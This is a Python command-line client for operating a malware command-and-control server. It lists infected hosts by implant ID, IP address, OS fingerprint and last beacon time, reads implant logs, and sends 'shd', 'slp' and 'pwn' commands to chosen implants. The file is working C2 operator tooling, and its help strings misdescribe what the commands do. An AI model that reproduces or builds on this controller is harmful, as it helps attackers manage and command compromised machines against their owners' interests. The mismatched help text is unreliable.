import argparse
import requests
import json
url = "http://127.0.0.1:5000"

def list_malware(args):
    url_formated = url + "/clients"
    response = requests.get(url_formated)
    response.raise_for_status()  # Raise error if status is not 200
    mals = response.json()       # Assuming the server returns JSON

    for mal in mals:
        json_mal = json.loads(mal)
        print(f"---------------Malware Id: {json_mal['id']}---------------")
        print(f"    IP Address: {json_mal['ip']}")
        print(f"    OS Fingerprint: {json_mal['os_signature']}")
        print(f"    Last Becon: {json_mal['last_beconed']}")

def cmd_log(args):
    url_formated = url + "/logs"
    params = {
        "id": f"{args.id}"
    }

    response = requests.get(url_formated, params=params)

    print(response.text)



def cmd_shd(args):
    url_formated = url + "/command"
    
    cmd= {
        "id": 
        args.id, 
        "command": "shd"
        }

    request = requests.post(url_formated, json=cmd)

def cmd_slp(args):
    url_formated = url + "/command"
    
    cmd= {
        "id": 
        args.id, 
        "command": f"slp:{args.seconds}"
        }

    request = requests.post(url_formated, json=cmd)

def cmd_pwn(args):
    url_formated = url + "/command"
    
    cmd= {
        "id": 
        args.id, 
        "command": f"pwn:{args.msg}"
        }

    request = requests.post(url_formated, json=cmd)


def main():
    parser = argparse.ArgumentParser(
        description="Base CLI tool with commands: list, log, shd, slp, pwd"
    )
    subparsers = parser.add_subparsers(dest='command', required=True)

    # list
    parser_list = subparsers.add_parser('list', help='List files in current directory')
    parser_list.set_defaults(func=list_malware)

    # log
    parser_log = subparsers.add_parser('log', help='Show logs')
    parser_log.add_argument('id', type=str, help='string of id')
    parser_log.set_defaults(func=cmd_log)

    # shd
    parser_shd = subparsers.add_parser('shd', help='Show scheduled tasks/info')
    parser_shd.add_argument('id', type=str, help='string of id')
    parser_shd.set_defaults(func=cmd_shd)

    # slp
    parser_slp = subparsers.add_parser('slp', help='Sleep for a given number of seconds')
    parser_slp.add_argument('seconds', type=str, help='Seconds to sleep')
    parser_slp.add_argument('id', type=str, help='string of id')
    parser_slp.set_defaults(func=cmd_slp)

    # pwd
    parser_pwn = subparsers.add_parser('pwn', help='Print current working directory')
    parser_pwn.add_argument('msg', type=str, help='Seconds to sleep')
    parser_pwn.add_argument('id', type=str, help='string of id')
    parser_pwn.set_defaults(func=cmd_pwn)

    args = parser.parse_args()
    args.func(args)

if __name__ == "__main__":
    main()